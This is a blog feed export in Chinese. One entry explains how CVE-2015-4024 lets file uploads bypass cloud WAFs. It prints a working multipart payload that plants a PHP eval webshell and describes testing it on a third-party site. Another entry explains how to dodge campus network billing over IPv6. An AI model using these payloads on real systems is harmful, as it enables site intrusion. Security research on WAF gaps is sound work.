(姓名, 年龄)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    VALUES (?, ?)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &#39;&#39;&#39;&lt;/span&gt;, (&lt;span class=&quot;string&quot;&gt;&#39;张三&#39;&lt;/span&gt;.decode(&lt;span class=&quot;string&quot;&gt;&#39;utf-8&#39;&lt;/span&gt;), &lt;span class=&quot;string&quot;&gt;&#39;22岁&#39;&lt;/span&gt;.decode(&lt;span class=&quot;string&quot;&gt;&#39;utf-8&#39;&lt;/span&gt;)))&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是如果数据太长，这样一个一个敲挺麻烦的，下面是一个使用map函数简化的小例子&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>WAF攻防研究之四个层次Bypass WAF</title>
    <link href="http://hacktech.cn/2016/09/25/WAF%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9B%9B%E4%B8%AA%E5%B1%82%E6%AC%A1Bypass-WAF/"/>
    <id>http://hacktech.cn/2016/09/25/WAF攻防研究之四个层次Bypass-WAF/</id>
    <published>2016-09-25T09:06:30.000Z</published>
    <updated>2016-09-25T09:13:42.655Z</updated>
    
    <content type="html"><![CDATA[<h1 id="绝对值得一看的技术文章"><a href="#绝对值得一看的技术文章" class="headerlink" title="绝对值得一看的技术文章"></a>绝对值得一看的技术文章</h1><p><a href="http://7xusrl.com1.z0.glb.clouddn.com/WAF%E6%94%BB%E9%98%B2%E7%A0%94%E7%A9%B6%E4%B9%8B%E5%9B%9B%E4%B8%AA%E5%B1%82%E6%AC%A1Bypass%20WAF.pdf" target="_blank" rel="external">pdf下载链接</a></p>
<p><em>[via@<a href="http://weibo.com/ttarticle/p/show?id=2309404007261092631700" target="_blank" rel="external">破-见</a> ]</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;绝对值得一看的技术文章&quot;&gt;&lt;a href=&quot;#绝对值得一看的技术文章&quot; class=&quot;headerlink&quot; title=&quot;绝对值得一看的技术文章&quot;&gt;&lt;/a&gt;绝对值得一看的技术文章&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://7xusrl.com1.z0.glb
    
    </summary>
    
      <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>PHP DOS漏洞的新利用：CVE-2015-4024 Reviewed</title>
    <link href="http://hacktech.cn/2016/09/24/PHP-DOS%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%96%B0%E5%88%A9%E7%94%A8%EF%BC%9ACVE-2015-4024-Reviewed/"/>
    <id>http://hacktech.cn/2016/09/24/PHP-DOS漏洞的新利用：CVE-2015-4024-Reviewed/</id>
    <published>2016-09-24T05:20:39.000Z</published>
    <updated>2016-09-25T09:10:36.645Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-背景介绍"><a href="#1-背景介绍" class="headerlink" title="1.     背景介绍"></a>1.     背景介绍</h1><p>今天我们想从2015.04.03的一个PHP远程dos漏洞（CVE-2015-4024）说起。技术细节见如下链接，<a href="https://bugs.php.net/bug.php?id=69364" target="_blank" rel="external">https://bugs.php.net/bug.php?id=69364</a>。因为php解析body part的header时进行字符串拼接，而拼接过程重复拷贝字符导致DOS。事实上该漏洞还有其他非dos的利用价值，其中之一，就是绕过当前各种云WAF的文件上传防御策略。</p>
<p>目前国内外流行的云WAF厂商有如百度云加速，360网站卫士，加速乐，云盾等。因为PHP远程dos漏洞及PHP官方修复方案的特点，我们成功利用该漏洞绕过了当前主流WAF的文件上传防御，例如百度云加速、360网站卫士、知道创于加速乐、安全狗。</p>
<p>接下来，我们以PHP为例，详细解析我们的绕过方法。</p>
<h1 id="2-绕过WAF的原理"><a href="#2-绕过WAF的原理" class="headerlink" title="2.     绕过WAF的原理"></a>2.     绕过WAF的原理</h1><p>根据PHP DOS漏洞原理，在multipart_buffer_headers函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符’:’，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块，从而导致DOS。</p>
<a id="more"></a>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">prev_len= strlen(prev_entry.value);</div><div class="line"></div><div class="line">cur_len= strlen(line);</div><div class="line"></div><div class="line">entry.value= emalloc(prev_len + cur_len + <span class="number">1</span>); <span class="comment">//1次分片内存</span></div><div class="line"></div><div class="line">memcpy(entry.value,prev_entry.value, prev_len); <span class="comment">//1次拷贝</span></div><div class="line"></div><div class="line">memcpy(entry.value+ prev_len, line, cur_len);   <span class="comment">//1次拷贝</span></div><div class="line"></div><div class="line">entry.value[cur_len+ prev_len] = <span class="string">'\0'</span>;</div><div class="line"></div><div class="line">entry.key= estrdup(prev_entry.key);</div><div class="line"></div><div class="line">zend_llist_remove_tail(header);<span class="comment">//1次内存释放</span></div></pre></td></tr></table></figure>
<p>而PHP官方修复方案，在进行合并时，避免重复拷贝，从而避免DOS。绕过WAF的关键在于，PHP multipart_buffer_headers函数解析header对应value时，value值存在多行。每行的字符串以空白符开头或不存字符’:’，将进行合并。而WAF在解析文件上传的文件名时，没有考虑协议兼容，不进行多行合并，就可以被绕过。</p>
<p>根据原理构造绕过WAF文件上传防御的payload，WAF解析到的文件名为”test3.jpg”，而PHP解析到的文件名是”test3.jpg\nf/shell.php”，因为”/”是目录分隔符，上传的文件名变为shell.php。以下是绕过paylaod、测试脚本、paylaod进行文件上传的效果图。</p>
<h2 id="WAF绕过payload"><a href="#WAF绕过payload" class="headerlink" title="WAF绕过payload:"></a>WAF绕过payload:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</div><div class="line"></div><div class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test3.jpg\nsf/shell.php</div><div class="line"></div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line">&lt;?php eval($_GET[&apos;c&apos;])?&gt;</div><div class="line"></div><div class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</div></pre></td></tr></table></figure>
<h2 id="文件上传功能测试脚本："><a href="#文件上传功能测试脚本：" class="headerlink" title="文件上传功能测试脚本："></a>文件上传功能测试脚本：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">         $name = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> $name;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"></div><div class="line">        move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>] , <span class="string">'/usr/local/nginx/html/upload/'</span>.$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"upload success! "</span>.$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"\n"</span>;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> strlen($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>Payload能够正常上传</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apwul8mrj30r50fptbm.jpg" alt="1"></p>
<h1 id="3-绕过WAF实战"><a href="#3-绕过WAF实战" class="headerlink" title="3.     绕过WAF实战"></a>3.     绕过WAF实战</h1><p>笔者通过搭建自己的测试站，接入360网站卫士和加速乐，验证绕过WAF文件上传防御的方法。</p>
<h2 id="3-1-绕过360网站卫士"><a href="#3-1-绕过360网站卫士" class="headerlink" title="3.1 绕过360网站卫士"></a>3.1 绕过360网站卫士</h2><h3 id="步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。"><a href="#步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。" class="headerlink" title="步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。"></a>步骤1，验证网站已被360网站卫士防御，拦截了直接上传PHP文件的请求。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apy2esg5j311v0ifdjx.jpg" alt="2"></p>
<h3 id="步骤2：成功绕过360网站卫士，上传shell成功，文件是apo-php。在该请求中，有没有Content-Type不影响绕过。"><a href="#步骤2：成功绕过360网站卫士，上传shell成功，文件是apo-php。在该请求中，有没有Content-Type不影响绕过。" class="headerlink" title="步骤2：成功绕过360网站卫士，上传shell成功，文件是apo.php。在该请求中，有没有Content-Type不影响绕过。"></a>步骤2：成功绕过360网站卫士，上传shell成功，文件是apo.php。在该请求中，有没有Content-Type不影响绕过。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6apztziwvj30vm0g9af6.jpg" alt="3"></p>
<h2 id="3-2-绕过知道创宇加速乐"><a href="#3-2-绕过知道创宇加速乐" class="headerlink" title="3.2 绕过知道创宇加速乐"></a>3.2 绕过知道创宇加速乐</h2><h3 id="步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。"><a href="#步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。" class="headerlink" title="步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。"></a>步骤一：验证网站被加速乐保护，拦截了直接上传PHP文件的请求。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq0sw1luj30wb0f9wjf.jpg" alt="4"></p>
<h3 id="步骤二：成功绕过加速乐，上传shell，文件是syt-php。"><a href="#步骤二：成功绕过加速乐，上传shell，文件是syt-php。" class="headerlink" title="步骤二：成功绕过加速乐，上传shell，文件是syt.php。"></a>步骤二：成功绕过加速乐，上传shell，文件是syt.php。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq1mvbrqj30vr0elwh2.jpg" alt="5"></p>
<h2 id="3-3-绕过百度云加速"><a href="#3-3-绕过百度云加速" class="headerlink" title="3.3. 绕过百度云加速"></a>3.3. 绕过百度云加速</h2><p>百度云加速与CloudFlare，从百度匀加速拦截页面可以看出使用的是CloudFlare. 但是估计有本地化，百度云加速应该是百度和CloudFlare共同产物吧。测试百度没有搭建自己的测试环境，找了个接入了百度云加速的站进行测试。</p>
<h3 id="步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。"><a href="#步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。" class="headerlink" title="步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。"></a>步骤一：验证网站被百度云加速保护，拦截了直接上传PHP文件的请求。</h3><p><img src="http://7xusrl.com1.z0.glb.clouddn.com/005K4Knkgw1f6aq30m0wjj31050etdko.jpg" alt="6"></p>
<h3 id="步骤二：成功绕过云加速"><a href="#步骤二：成功绕过云加速" class="headerlink" title="步骤二：成功绕过云加速"></a>步骤二：成功绕过云加速</h3><p>同上</p>
<h1 id="4-扩展—更多的工作"><a href="#4-扩展—更多的工作" class="headerlink" title="4.     扩展—更多的工作"></a>4.     扩展—更多的工作</h1><h2 id="4-1-分析filename其他字符的绕过"><a href="#4-1-分析filename其他字符的绕过" class="headerlink" title="4.1 分析filename其他字符的绕过"></a>4.1 分析filename其他字符的绕过</h2><p>同理，我们发现除了双引号外，使用单引号也能绕过WAF的防御，并实现文件上传。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</div><div class="line"></div><div class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&apos;test3.jpg\nsf/shell.php</div><div class="line"></div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line">&lt;?php eval($_GET[&apos;c&apos;])?&gt;</div><div class="line"></div><div class="line">------WebKitFormBoundaryx7V4AhipWn8ig52y</div></pre></td></tr></table></figure>
<h2 id="4-2-分析其他应用脚本语言"><a href="#4-2-分析其他应用脚本语言" class="headerlink" title="4.2 分析其他应用脚本语言"></a>4.2 分析其他应用脚本语言</h2><p>我们也发现jsp解析也有自己的特点，同时可被用于绕过WAF。暂时未测试asp,aspx,python等常用的WEB应用脚本语言。</p>
<h1 id="5-修复方案"><a href="#5-修复方案" class="headerlink" title="5.     修复方案"></a>5.     修复方案</h1><h2 id="5-1-修复方案一"><a href="#5-1-修复方案一" class="headerlink" title="5.1 修复方案一"></a>5.1 修复方案一</h2><p>解析文件上传请求时，如果发现请求不符合协议规范，则拒绝请求。可能会产生误拦截，需要评估误拦截的影响范围。</p>
<h2 id="5-2-修复方案二"><a href="#5-2-修复方案二" class="headerlink" title="5.2 修复方案二"></a>5.2 修复方案二</h2><p>兼容php的文件解析方式，解析文件名时，以单引号或双引号开头，并且对应的单引号双引号闭合。</p>
<h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6.     总结"></a>6.     总结</h1><p>本文通过Review PHP远程dos漏洞(CVE-2015-4024)，并利用该特性绕过现有WAF的文件上传防御，成功上传shell。 更重要的价值，提供给我们一个绕过WAF的新思路，一种研究新方向：利用后端应用脚本与WAF行为的差异绕过WAF的防御。总的来说，一款优秀的WAF应该能够处理兼容WEB应用容器、标准协议、web服务器这间的差异。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-背景介绍&quot;&gt;&lt;a href=&quot;#1-背景介绍&quot; class=&quot;headerlink&quot; title=&quot;1.     背景介绍&quot;&gt;&lt;/a&gt;1.     背景介绍&lt;/h1&gt;&lt;p&gt;今天我们想从2015.04.03的一个PHP远程dos漏洞（CVE-2015-4024）说起。技术细节见如下链接，&lt;a href=&quot;https://bugs.php.net/bug.php?id=69364&quot;&gt;https://bugs.php.net/bug.php?id=69364&lt;/a&gt;。因为php解析body part的header时进行字符串拼接，而拼接过程重复拷贝字符导致DOS。事实上该漏洞还有其他非dos的利用价值，其中之一，就是绕过当前各种云WAF的文件上传防御策略。&lt;/p&gt;
&lt;p&gt;目前国内外流行的云WAF厂商有如百度云加速，360网站卫士，加速乐，云盾等。因为PHP远程dos漏洞及PHP官方修复方案的特点，我们成功利用该漏洞绕过了当前主流WAF的文件上传防御，例如百度云加速、360网站卫士、知道创于加速乐、安全狗。&lt;/p&gt;
&lt;p&gt;接下来，我们以PHP为例，详细解析我们的绕过方法。&lt;/p&gt;
&lt;h1 id=&quot;2-绕过WAF的原理&quot;&gt;&lt;a href=&quot;#2-绕过WAF的原理&quot; class=&quot;headerlink&quot; title=&quot;2.     绕过WAF的原理&quot;&gt;&lt;/a&gt;2.     绕过WAF的原理&lt;/h1&gt;&lt;p&gt;根据PHP DOS漏洞原理，在multipart_buffer_headers函数解析header对应value时，value值存在n行。每行的字符串以空白符开头或不存字符’:’，都触发以下合并value的代码块。那么解析header的value就要执行(n-1)次合并value的代码块，从而导致DOS。&lt;/p&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>基于Openwrt+Shadowsocks+ipv6实现校园网免流量无限时长上网</title>
    <link href="http://hacktech.cn/2016/09/24/%E5%9F%BA%E4%BA%8EOpenwrt-Shadowsocks-ipv6%E5%AE%9E%E7%8E%B0%E6%A0%A1%E5%9B%AD%E7%BD%91%E5%85%8D%E6%B5%81%E9%87%8F%E6%97%A0%E9%99%90%E6%97%B6%E9%95%BF%E4%B8%8A%E7%BD%91/"/>
    <id>http://hacktech.cn/2016/09/24/基于Openwrt-Shadowsocks-ipv6实现校园网免流量无限时长上网/</id>
    <published>2016-09-24T02:46:02.000Z</published>
    <updated>2016-09-24T03:23:26.773Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>转载自<a href="http://www.jianshu.com/p/4d44172f1a5b" target="_blank" rel="external">Dyhube</a></p>
</blockquote>
<h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>笔者利用笔记本电脑实现ipv6免费上网已经有一段时间了，原理是通过ipv6访问ipv4资源，在学校网络不限流量、不限时长、20兆带宽（我们学校ipv6限速上下对等20兆，没办法！）,电脑开热点全寝室共用，那真是爽翻天 !</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/ipv6.png" alt="ipv6"></p>
<a id="more"></a>
<p>但是每天回到寝室总是打开电脑开热点还真是蛋疼的事情。再说电脑也不能总是开着吧。这时我就想能不能找个路由器，一天二十四小时开机，电脑、手机、平板随时都可以连。这个想法大概出现在半年前，由于手里没有路由器，就一直没弄，但是网上是有各种成功的案例的。</p>
<p>前段时间手里终于进了台K1，由于之前已经查了相当多的教程，所以就顺风顺水，很快就成功了。下面我就主要讲一下openwrt客户端的配置问题。</p>
<h1 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h1><p>在大部分高校，ipv4一般是计流量或计时收费的，（笔者学校就是计时收费的，50元200小时网通十兆带宽）而且，由于校园的特殊性，相应的价格也比市面上宽带服务商要高。万幸的是，这些高校一般具有ipv6网络环境，并且由于国家的大力支持，普及范围广，而且不计算流量，聪明的人早就想能不能通过利用ipv6已达到免流量及无限时长上网？答案是可行的，鉴于目前公网的环境普遍是ipv4，我们可以找一台同时具有ipv4和ipv6地址的服务器，我们在校内通过ipv6访问服务器，然后服务器处理我们的访问请求以<code>ipv4/ipv6双栈</code>的方式代替我们访问互联网，再将数据通过ipv6反馈给我们，从而到达免流上网的目的。并且，考虑到大部分高校ipv6没有限制速度，理论上可以达到服务器出口的带宽，当然，具体取决于你们学校的ipv6出口带宽。</p>
<h1 id="为什么用Shadowsocks？"><a href="#为什么用Shadowsocks？" class="headerlink" title="为什么用Shadowsocks？"></a>为什么用Shadowsocks？</h1><p>配置简单，真的简单！以前看到过信息学院的学长写的一篇blog,原理是<code>ipv6 to ipv4</code> 从而ipv6 to ipv4网络,其实原理是一样的，只是他用了<code>openvpn</code>这个软件，但是感觉实现起来好难。像这样的开源支持ipv6协议的软件还是有很多的，这里就不再陈述。</p>
<p>回到原题为什么用Shadowsocks，配置简单。vps服务提供商<a href="https://bandwagonhost.com/" target="_blank" rel="external">搬瓦工</a>现在为了迎合国人的需求现在已经预配了Shadowsocks,只需要点击以下安装就ok了。</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-ab3dea8d36104b08.png" alt="1"></p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-ab3dea8d36104b08.png" alt="2"></p>
<h1 id="适用对象"><a href="#适用对象" class="headerlink" title="适用对象"></a>适用对象</h1><p>具有<code>ipv6地址</code>、<code>ipv4流量</code>（计时）收费贵爱折腾的大学生。不推荐打国服游戏，延迟你懂的，但对延迟没要求的游戏还是可以玩的，美服、亚服、台服随你玩。</p>
<h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><h2 id="openwrt固件路由器"><a href="#openwrt固件路由器" class="headerlink" title="openwrt固件路由器"></a>openwrt固件路由器</h2><p>路由器的刷机请自行Google,教程一大堆，刷机时笔者也遇到过很多问题，坚持！如果你的也是K1路由器，也要刷机，不妨看这个<a href="http://akkuman.coding.me/2016/09/22/%E7%BB%99%E6%96%90%E8%AE%AFK1%E5%88%B7%E6%9C%BA%E5%B9%B6%E6%8B%A8%E5%8F%B7e%E4%BF%A1-%E6%B9%96%E5%8C%97%E5%9C%B0%E5%8C%BA%E6%B5%8B%E8%AF%95%E6%97%A0%E9%97%AE%E9%A2%98/" target="_blank" rel="external">教程</a>。刷机的重点是刷<code>Shadowsocks插件</code>，我的K1直接刷的来自恩山网友的固件，固件里已经附带了Shadowsocks。<a href="http://pan.baidu.com/s/1dFJO4hF" target="_blank" rel="external">openwrt</a>固件自取。openwrt控制面板上图。</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-ed11845c67728119.png" alt="3"></p>
<h2 id="Shadowsocks-ipv6节点信息"><a href="#Shadowsocks-ipv6节点信息" class="headerlink" title="Shadowsocks+ipv6节点信息"></a>Shadowsocks+ipv6节点信息</h2><p>因为笔者手里有台美国的vps，并且配置了Shadowsocks，所以现在拿来就直接用，老实说搭建的Shadowsocks平常很少用，之前觉得租这个vps很是浪费。但是自从寝室里有了这台全天候开机的路由器，值了！在这里我要强调一下，Shadowsocks的节点我们需要ipv6地址的，不然还是没法走校内的ipv6通道。</p>
<h1 id="前方高能预警"><a href="#前方高能预警" class="headerlink" title="前方高能预警"></a>前方高能预警</h1><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>首先openwrt固件路由器登陆<code>192.168.1.1</code>，初始登录默认密码是：<code>admin</code>。登进去之后最好先不要对任何东西改动，按照正常路由器的配置对路由器进行拨号上网。然后选择<code>Shadowsocks插件</code>，选择<code>启动</code>。（为什么这样做呢？笔者尝试了几下，不拨号上网的话，<code>Shadowsocks</code>和<code>DNS</code>配置好了以后无法上网，最后总结，先拨号上网、再配置<code>Shadowsocks</code>和<code>DNS</code>信息）</p>
<p>步骤：点击 <code>openwrt服务</code>&gt;<code>Shadowsocks</code>，出现以下界面。</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-8304c61781a62c95.png" alt="4"></p>
<h2 id="Shadowsocks的配置"><a href="#Shadowsocks的配置" class="headerlink" title="Shadowsocks的配置"></a>Shadowsocks的配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">服务器ip：  </div><div class="line">密码：  </div><div class="line">服务器端口：  </div><div class="line">加密方式：</div></pre></td></tr></table></figure>
<p>对Shadowsocks配置好了以后，点击下面的透明代理，选择<code>启动</code>。</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-b2304b09473a3a76.png" alt="5"></p>
<p>对Shadowsocks配置好以后，我们的任务还没有结束，最重要的就是配置<code>DNS信息</code>。这里如果不配置DNS，IP地址选择ipv4的，Shadowsocks是国外的，那么通过这种方式使用Shadowsocks就是通过路由器来翻fq，在这里我就不多说了。</p>
<h2 id="DNS的配置"><a href="#DNS的配置" class="headerlink" title="DNS的配置"></a>DNS的配置</h2><p>DNS设置有两种方案，一种是利用<code>ChinaDNS</code>，还有一种直接在<code>DHCP/DNS</code>设置页面（<code>网络&gt;DHCP/DNS</code>）进行填写。</p>
<p>由于本次折腾的特殊性，路由器工作在<code>纯ipv6环境</code>下，也就是说路由器没有ipv4的网络，但常用的DNS服务器大多是以ipv4地址方式提供的，如果使用ipv4的DNS服务器就会导致无法解析。此处用了<code>[2001:470:0:c0::2]</code>，但是很不幸，该DNS被污染了，无法解析如google，youtube一类网址，但是对国内的网站的解析很好。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">2001:470:0:c0::2</div></pre></td></tr></table></figure>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/877518-a819f528346ea980.png" alt="6"></p>
<p>其他的DNS最好选择Google的，相对的来说，网站解析最全面，而且还可以fq,只是一部分了，选择Google的公共DNS有一个缺点，就是像移动端的微信或者qq了，朋友圈的信息或公众号加载不出来，这是很蛋疼的事情。个人还是推荐上面的那条DNS,速度快、国内网站全面，几乎全覆盖。</p>
<p>下面是一些从网上找来的公共DNS，可以试验一下，说不定有什么以外的收获呢。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">ordns.he.net  2001:470:20::2     74.82.42.42</div><div class="line"></div><div class="line">tserv1.fmt2.he.net  2001:470:0:45::2   72.52.104.74</div><div class="line"></div><div class="line">tserv1.dal1.he.net  2001:470:0:78::2   216.218.224.42</div><div class="line"></div><div class="line">tserv1.ams1.he.net  2001:470:0:7d::2   216.66.84.46</div><div class="line"></div><div class="line">tserv1.mia1.he.net  2001:470:0:8c::2   209.51.161.58</div><div class="line"></div><div class="line">tserv1.tor1.he.net  2001:470:0:c0::2   216.66.38.58</div><div class="line"></div><div class="line">ns.ipv6.uni-leipzig.de  2001:638:902:1::10   139.18.25.34</div></pre></td></tr></table></figure>
<h2 id="Google-Public-DNS"><a href="#Google-Public-DNS" class="headerlink" title="Google Public DNS"></a>Google Public DNS</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">google-public-dns-a.google.com  2001:4860:4860::8888   8.8.8.8</div><div class="line"></div><div class="line">google-public-dns-b.google.com  2001:4860:4860::8844   8.8.4.4</div></pre></td></tr></table></figure>
<p>码字不容易，在这里非常感谢<a href="http://www.jianshu.com/p/6559d6e4e7ab" target="_blank" rel="external">_Echo</a>和<a href="https://www.zhangzhe.info/2016/03/openwrt-shadowsocks-ipv6/" target="_blank" rel="external">张哲</a>两人的post.</p>
<blockquote>
<p>转载自<a href="http://www.jianshu.com/p/4d44172f1a5b" target="_blank" rel="external">Dyhube</a></p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;转载自&lt;a href=&quot;http://www.jianshu.com/p/4d44172f1a5b&quot;&gt;Dyhube&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;简述&quot;&gt;&lt;a href=&quot;#简述&quot; class=&quot;headerlink&quot; title=&quot;简述&quot;&gt;&lt;/a&gt;简述&lt;/h1&gt;&lt;p&gt;笔者利用笔记本电脑实现ipv6免费上网已经有一段时间了，原理是通过ipv6访问ipv4资源，在学校网络不限流量、不限时长、20兆带宽（我们学校ipv6限速上下对等20兆，没办法！）,电脑开热点全寝室共用，那真是爽翻天 !&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xusrl.com1.z0.glb.clouddn.com/ipv6.png&quot; alt=&quot;ipv6&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="生活" scheme="http://hacktech.cn/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="life" scheme="http://hacktech.cn/tags/life/"/>
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>OpenWRT路由器使用ipv6拨号上网教程</title>
    <link href="http://hacktech.cn/2016/09/22/Openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E4%BD%BF%E7%94%A8ipv6%E6%8B%A8%E5%8F%B7%E4%B8%8A%E7%BD%91%E6%95%99%E7%A8%8B/"/>
    <id>http://hacktech.cn/2016/09/22/Openwrt路由器使用ipv6拨号上网教程/</id>
    <published>2016-09-22T07:39:45.000Z</published>
    <updated>2016-09-22T08:04:15.683Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>文章来源于群友，如有侵权，请联系我(aha971030@gmail.com)删除</p>
</blockquote>
<h1 id="原理介绍分析："><a href="#原理介绍分析：" class="headerlink" title="原理介绍分析："></a>原理介绍分析：</h1><p>湖北E信地区可以使用ipv6拨号，好处是网络是上下对等不限速网络，也就是说，你的端口上限是多少，网上就可以达到多少，我测试很多次，一般在100M左右，但是遗憾的是，该拨号方式只能使用32位系统，且由于E信软件的兼容性问题，很容易导致蓝屏死机。经过大神的抓包分析，该拨号方式是使用ipv6的隧道协议传递ipv4信号。而幸运的是，现在的openwrt支持该协议。也就是说可以使用基于openwrt的路由器采用ipv6拨号。</p>
<h1 id="操作步骤："><a href="#操作步骤：" class="headerlink" title="操作步骤："></a>操作步骤：</h1><p>首先要明确是，该拨号方式也是需要进行账号换算的，首先启动路由器，并插上网线，在电脑上下载winscp这款软件，然后我们查询一下我们的ip地址，在电脑的dos界面输入ipconfig，找到以太网配置器</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/network111.png" alt="network111"></p>
<a id="more"></a>
<p>默认网关就是路由器的管理ip。</p>
<p>然后我们启动软件，按照图片设置填入数据</p>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/winscp111.png" alt="winscp111"></p>
<p>然后我们就进入了路由器的文件系统</p>
